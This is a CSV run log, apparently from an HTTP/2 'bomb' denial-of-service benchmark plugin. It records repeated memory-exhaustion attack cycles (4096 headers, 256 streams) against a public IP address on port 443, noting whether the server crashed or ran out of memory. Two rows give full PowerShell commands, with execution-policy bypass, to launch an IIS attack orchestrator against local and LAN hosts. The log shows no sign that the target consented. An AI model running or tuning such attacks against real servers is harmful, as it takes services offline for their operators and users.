run_id,timestamp,strategy,target,connections_requested,connections_established,connections_bomb_ok,connections_active_end,wire_mb,hold_sec,probe_before_code,probe_after_code,probe_worst_latency,server_down,oom_likely,duration_sec,notes
e660efc8,2026-06-04T19:44:42.804718+00:00,opt_oom_cycle_18,69.62.121.168:443,70,70,32,32,125.09,8,200,200,0.097,False,False,74.3,"optimized single-client cycle 18 (4096 headers, 256 streams)"
f112cd3f,2026-06-04T19:45:56.490030+00:00,opt_oom_cycle_19,69.62.121.168:443,70,70,31,31,121.18,8,200,200,0.104,False,False,71.7,"optimized single-client cycle 19 (4096 headers, 256 streams)"
8deb82c4,2026-06-04T19:47:10.094277+00:00,opt_oom_cycle_20,69.62.121.168:443,70,70,31,31,121.18,8,200,200,0.091,False,False,71.6,"optimized single-client cycle 20 (4096 headers, 256 streams)"
6ef5a133,2026-06-04T19:48:26.219215+00:00,opt_oom_cycle_21,69.62.121.168:443,70,70,32,32,125.09,8,200,200,0.084,False,False,74.1,"optimized single-client cycle 21 (4096 headers, 256 streams)"
d825c0bd,2026-06-04T19:49:41.562894+00:00,opt_oom_cycle_22,69.62.121.168:443,70,70,31,31,121.18,8,200,200,0.081,False,False,73.3,"optimized single-client cycle 22 (4096 headers, 256 streams)"
7223d0a9,2026-06-04T19:50:57.726673+00:00,opt_oom_cycle_23,69.62.121.168:443,70,70,31,31,121.18,8,200,200,0.089,False,False,74.2,"optimized single-client cycle 23 (4096 headers, 256 streams)"
503d2605,2026-06-04T19:52:11.352713+00:00,opt_oom_cycle_24,69.62.121.168:443,70,70,31,31,121.18,8,200,200,0.089,False,False,71.6,"optimized single-client cycle 24 (4096 headers, 256 streams)"
c29a5426,2026-06-04T19:53:25.154197+00:00,opt_oom_cycle_25,69.62.121.168:443,70,70,30,30,117.27,8,200,200,0.08,False,False,71.8,"optimized single-client cycle 25 (4096 headers, 256 streams)"
75c184c5,2026-06-05T10:43:58.458730+00:00,apex_iis_mp_8gb,127.0.0.1:443,10000,0,0,-1,0.0,0,0,0,0,True,True,0.0,"linux stub — run on Windows: powershell -ExecutionPolicy Bypass -File ""/home/danii/.cursor/plugins/local/http2-bomb-mcp/benchmark/iis_apex_orchestrator.ps1"" -Host 127.0.0.1 -Port 443 -Preset 8gb"
a682da5a,2026-06-05T11:18:43.785328+00:00,apex_iis_mp_8gb,192.168.2.101:443,10000,0,0,-1,0.0,0,0,0,0,True,True,6.2,"linux stub — run on Windows: powershell -ExecutionPolicy Bypass -File ""/home/danii/.cursor/plugins/local/http2-bomb-mcp/benchmark/iis_apex_orchestrator.ps1"" -Host 192.168.2.101 -Port 443 -Preset 8gb"
